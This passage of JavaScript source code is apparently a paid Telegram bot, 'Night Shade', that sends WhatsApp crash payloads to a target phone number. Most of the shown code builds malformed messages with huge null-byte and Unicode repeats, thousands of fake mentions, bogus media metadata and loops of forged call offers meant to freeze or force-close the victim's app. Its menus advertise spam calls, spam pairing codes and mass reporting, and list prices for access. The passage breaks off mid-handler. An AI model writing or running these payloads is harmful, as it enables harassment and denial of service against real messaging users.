        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
    
    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: ZhTxRizzMsg.message
        }
      },
      jid
        ? { messageId: ZhTxRizzMsg.key.id, participant: { jid: jid } }
        : { messageId: ZhTxRizzMsg.key.id }
    );
  }
    console.log(chalk.red(`Succes Sending Bug By Rayy To ${target}`));
}

async function Nukleotix(sock, jid) {
  try {
    let msg = await generateWAMessageFromContent(jid, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointCenversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: jid },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function DelayHard(sock, jid) {
  for (let i = 0; i < 1000; i++) {
    await sock.relayMessage(jid, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "CsmX.zip",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: ""
              },
              hasMediaAttachment: true
            },
            body: {
              text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                length: 2000
              }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "CsmX.doc",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      },
    }, {
      messageId: null,
      participant: { jid: jid }
    });
  }
  await new Promise((r) => setTimeout(r, 1500));
  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "CosmoX.zip",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
              length: 2000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "CsmX.doc",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    },
  }, {
    messageId: null,
    participant: { jid: jid }
  });

  for (let i = 0; i < 1000; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessagw: {
        message: {
          messageContextInfo: {
            deviceListMetada: {},
            deviceListMetadaVersion: 2
          },
          interactiveResponseMessage: {
            body: {
              text: "x",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              fromMe: false,
              participant: jid,
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "address_message",
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(jid, {
      groupStatusMessageV2: {
       message: msg.message
      }
    }, {
      messageId: msg.key.id,
      participant: { jid: jid }
    });
    await new Promise((r) => setTimeout(r, 1000));
  }

  var msg = generateWAMessageFromContent(jid, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
      "fileLength": "231536",
      "seconds": 88888888,
      "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
      "caption": "x",
      "height": -99999,
      "width": 99999,
      "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
      "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
      "mediaKeyTimestamp": "1771576607",
      "contextInfo": {
        "pairedMediaType": "NOT_PAIRED_MEDIA",
        "statusSourceType": "VIDEO",
        "remoteJid": " #xrellyspec ",
        "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
        "businessMessageForwardInfo": {
          "businessOwnerJid": "13135550202@s.whatsapp.net",
          "businessDescription": null
        },
        "featureEligibilities": {
          "canBeReshared": true
        },
        "isForwarded": true,
        "forwardingScore": 9999,
        "statusAttributions": [
          {
            "type": "MUSIC",
            "externalShare": {
              "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
              "source": "INSTAGRAM",
              "duration": 999999999,
              "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
            }
          }
        ]
      },
      "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
      "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
      "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
      "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
      "annotations": [
        {
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMessage": {
              "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
              "message": {
                "extendedTextMessage": {
                  "text": "$",
                  "previewType": "NONE",
                  "inviteLinkGroupTypeV2": "DEFAULT"
                },
                "messageContextInfo": {
                  "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                  "messageAssociation": {
                    "associationType": 18,
                    "parentMessageKey": {
                      "remoteJid": "status@broadcast",
                      "fromMe": false,
                      "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                      "participant": "13135550202@s.whatsapp.net"
                    }
                  }
                }
              }
            }
          },
          "embeddedAction": true
        }
      ],
      "externalShareFullVideoDurationInSeconds": 8
    }
  }, {})

    let kel = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: " x ",
                mentionedJid: ["13135559098@s.whatsapp.net"],
              },
              body: {
                text: "fuck u",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                version: 3,
              },
            },
          },
        },
      },
      {
        participant: { jid: jid },
      },
    );

    await sock.relayMessage('status@broadcast', msg.message, {
      statusJidList: [jid]
    });

    await sock.relayMessage('status@broadcast', kel.message, {
      statusJidList: [jid]
    });
}

// ~ ( CRASH CLICK NO INVIS ) ~ \\

async function ZhTForceCloseNew(sock, jid) {
    let ZhTxRizzMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: "H3LL0",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
               }
              ]
            }
          }
        }
      }
    }
    await sock.relayMessage(jid, ZhTxRizzMsg, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid,
    });
}

// ~ ( BLANK CLICK ) ~ \\

async function systemui(sock, jid) {
  try {
    const msg = await generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            extendedTextMessage: {
              text: "System Ui" + "ꦽ".repeat(25000),
              contextInfo: {
                participant: jid,
                remoteJid: "0@s.whatsapp.net",
                mentionedJid: [jid]
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
      participant: { jid: jid }
    });
  } catch (err) {
    console.error("Error:", err);
  }
}

async function superpowers(sock, jid) {
  const paylod = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "#",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000)
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000)
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000)
                })
              }
            ],
            messageParamsJson: "[{".repeat(10000)
          }
        }
      }
    }
  };

  const msg2 = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "#".repeat(5000),
      caption: "ꦽ".repeat(5000),
      inviteExpiration: "909092899"
    }
  };

  const msg3 = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363407468452340@newsletter",
      newsletterName: "🍷⃟༑⌁⃰Three Brothers🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      caption: "🍷⃟༑⌁⃰Three Broters🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      inviteExpiration: "999999999"
    }
  };
  await sock.relayMessage(jid, paylod, {
    messageId: null,
    participant: { jid: jid }
  });
  await sock.relayMessage(jid, msg2, {
    messageId: null,
    participant: { jid: jid }
  });
  await sock.relayMessage(jid, msg3, {
    participant: { jid: jid },
    messageId: null
  });

  console.log("Sending Blank");
}

// ~ ( FORCLOSE INVIS BEBAS SPAM ) ~ \\

async function MakLoInpis(sock, jid) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("xatabail");
    const crypto = require("crypto");
    let devices = (
        await sock.getUSyncDevices([jid], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let node1 = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let node2 = node1();
    let node3 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let node4 = sock.createParticipantNodes.bind(sock);
    let node5 = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = node3(
                    node5 ? node5(msg) : encodeWAMessage(msg)
                );

                return node2.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 50000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 100; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: jid,
                    id: sock.generateMessageTag(),
                    from: sock.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await sock.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try {
            await sock.chatModify({ clear: true }, jid);
            console.log("SUCCES");
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log(chalk.red("Succesfully Send Forclose New"));  
}

//------------------------------------------------------------------------------------------------------------------------------\\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const isPrivate = msg.chat.type === 'private';
  const CONFETTI_ID = "5104841245755180586";
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const developer = "@joyyyclod";
  const name = "Night Shade";
  const version = "12.0.0";
  const platform = "telegram";
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    message_effect_id: isPrivate ? CONFETTI_ID : null,
    caption: `
\`\`\`javascript
╔═════✦༻💀༺✦═══════╗
    𝐖𝐄𝐋𝐂𝐎𝐌𝐄 — 𝐔𝐒𝐄𝐑𝐒
╚═════✦༻💀༺✦═══════╝
𝗡𝗜𝗚𝗛𝗧 𝗦𝗛𝗔𝗗𝗘
V12.0.0

👑𝗖𝗥𝗘𝗔𝗧𝗢𝗥 : @joyyyclod

✨𝗦𝗨𝗣𝗣𝗢𝗥𝗧 : @ApongSkt

🔪𝗘 𝗙 𝗙 𝗘 𝗖 𝗧 𝗦
• ForClose Call
• Delay Hard Invisible 
• Crash Click 
• Blank Hard Click
• ForClose Invisible Bebas Spam

🛡️𝗞𝗘𝗔𝗠𝗔𝗡𝗔𝗡
• Encrypt Hard
• Database Token
• Auto Update

💸𝗣𝗥𝗜𝗖𝗘
• Script Full Up : 5.000
• Reseller : 15.000

"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."

Tap Buton Bellow To Contine ->
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
         [
          { text: "⬅️", callback_data: "back_to_main" },
          { text: "➡️", callback_data: "owner_menu" }
         ]
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;

    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";

    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(senderId);
    const developer = "@joyyyclod";
    const name = "Night Shade";
    const version = "12.0.0";
    const platform = "telegram";

    // jawab callback SEKALI
    await bot.answerCallbackQuery(query.id, {
      text: "🫀 Mohon Sabar",
      show_alert: false,
    });

    let caption = "";
    let replyMarkup = {};
    let media = getRandomImage();

    /* ================= MAIN MENU ================= */
    if (query.data === "back_to_main") {
      caption = `
\`\`\`javascript
╔═════✦༻💀༺✦═══════╗
    𝐖𝐄𝐋𝐂𝐎𝐌𝐄 — 𝐔𝐒𝐄𝐑𝐒
╚═════✦༻💀༺✦═══════╝
𝗡𝗜𝗚𝗛𝗧 𝗦𝗛𝗔𝗗𝗘
V12.0.0

👑𝗖𝗥𝗘𝗔𝗧𝗢𝗥 : @joyyyclod

✨𝗦𝗨𝗣𝗣𝗢𝗥𝗧 : @ApongSkt

🔪𝗘 𝗙 𝗙 𝗘 𝗖 𝗧 𝗦
• ForClose Call
• Delay Hard Invisible 
• Crash Click 
• Blank Hard Click
• ForClose Invisible Bebas Spam

🛡️𝗞𝗘𝗔𝗠𝗔𝗡𝗔𝗡
• Encrypt Hard
• Database Token
• Auto Update

💸𝗣𝗥𝗜𝗖𝗘
• Script Full Up : 5.000
• Reseller : 15.000

"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."

Tap Buton Bellow To Contine ->
\`\`\`
`;
      replyMarkup = {
        inline_keyboard: [
          [
          { text: "⬅️", callback_data: "back_to_main" },
          { text: "➡️", callback_data: "owner_menu" }
         ]
        ],
      };
    }

    else if (query.data === "tempatbug") {
      caption = `
\`\`\`javascript
BUG TYPE

Silahkan Memilih Bug Dibawah Ini
@joyyyclod

⚠️ Status : ACTIVE\`\`\`
`;

    media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Delay Invis", callback_data: "/delay" },
            { text: "Force Close", callback_data: "/fc" }
          ],
          [
            { text: "Crash", callback_data: "/crash" },
            { text: "Blank", callback_data: "/blank" }
          ],
          [
            { text: "Owner", url: "https://t.me/joyyyclod" },
            { text: "Channel", url: "https://t.me/testimonijoyycloud" }
          ],
          [
            { text: "⬅️", callback_data: "owner_menu" },
            { text: "➡️", callback_data: "tools" }
          ]
        ],
      };
    }
    
    /* ================= BUG MENU 1 ================= */
    else if (query.data === "/delay") {
      caption = `
\`\`\`javascript
DELAY ANDROID

╭───────────────
│/delayhard • DELAY ANDROID
│/delayinpis • DELAY INVISIBLE
╰───────────────

⚠️ Status : ACTIVE\`\`\`
`;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "tempatbug" }
          ]
        ],
      };
    }

    /* ================= BUG MENU 2 ================= */
    else if (query.data === "/fc") {
      caption = `
\`\`\`javascript
FORCLOSE

╭───────────────
│/forclose • FORCE CLOSE TYPE INVIS 
│/fcall • FORCE CLOSE TYPE CALL
╰───────────────

⚠️ Status : ACTIVE\`\`\`
`;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "tempatbug" }
          ]
        ],
      };
    }
    
    else if (query.data === "/blank") {
      caption = `
\`\`\`javascript
BLANK

╭───────────────
│/blanksit • BLANK TYPE CLICK
╰───────────────

⚠️ Status : ACTIVE\`\`\`
`;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "tempatbug" }
          ]
        ],
      };
    }
    
    else if (query.data === "/crash") {
      caption = `
\`\`\`javascript
CRASH

╭───────────────
│/crashclick • CRASH TYPE CLICK
╰───────────────

⚠️ Status : ACTIVE\`\`\`
`;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "tempatbug" }
          ]
        ],
      };
    }
    
    // TOOLS DAN FUN MENU
    
    else if (query.data === "tools") {
      caption = `
\`\`\`javascript
⚔ TOOLS & FUN MENU
page 4 / 5

TOOLS MENU
—————————————————
• /SpamPairing → Spam Kode Pairing
• /SpamCall → Spam Telpon
• /hapusbug → Hapus Bug
• /SpamReportWhatsapp → Spam Whatsapp

FUN MENU
—————————————————
• /tourl → Ga Tau Lupa Cek Aja
• /brat → Bikin Stiker

Security Mode : ACTIVE\`\`\`
`;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "⬅️", callback_data: "tempatbug" },
            { text: "➡️", callback_data: "tq" }
          ]
        ],
      };
    }
    
    else if (query.data === "tq") {
      caption = `
\`\`\`javascript
SUPPORT & CREDITS
page 5 / 5

KING OWNER 
• @joyyyclod

SUPPORT
• @ApongSkt

Security : FULL ACTIVE
Network : Joyy\`\`\`
`;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "⬅️", callback_data: "tools" },
            { text: "Owner", url: "https://t.me/joyyyclod" },
            { text: "Home", callback_data: "back_to_main" }
          ]
        ],
      };
    }
      

    /* ================= OWNER MENU ================= */
    else if (query.data === "owner_menu") {
      caption = `
\`\`\`javascript
🛠  SYSTEM CONTROL
page 2 / 3

DEVELOPER COMMAND
—————————————————
• /addowner → Add Owner
• /delowner → Hapus Owner
• /addadmin → Add Admin
• /deladmin → Hapus Admin
• /addprem → Add premium
• /delprem → Hapus Premium
• /setcd → Atur Waktu Bug
• /addsender → Tambah Sender
• /listbot →Cek Sender Aktif

ADMIN COMMAND
—————————————————
• /addprem → Add Premium
• /delprem → Hapus Premium
• /setcd → Atur Waktu Bug
• /addsender → Tambah Sender
• /listbot → Cek Sender Aktif
• /update → Untuk Update Script

Security Mode : ACTIVE
Network : Joyy\`\`\`
`;
      media = ownerUrl;
      replyMarkup = {
        inline_keyboard: [
       [
            { text: "⬅️", callback_data: "back_to_main" },
            { text: "➡️", callback_data: "tempatbug" }
       ]
      ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media,
        caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
    
//=======CASE BUG=========//
bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA JOYY IMUT
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/joyyyclod",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`
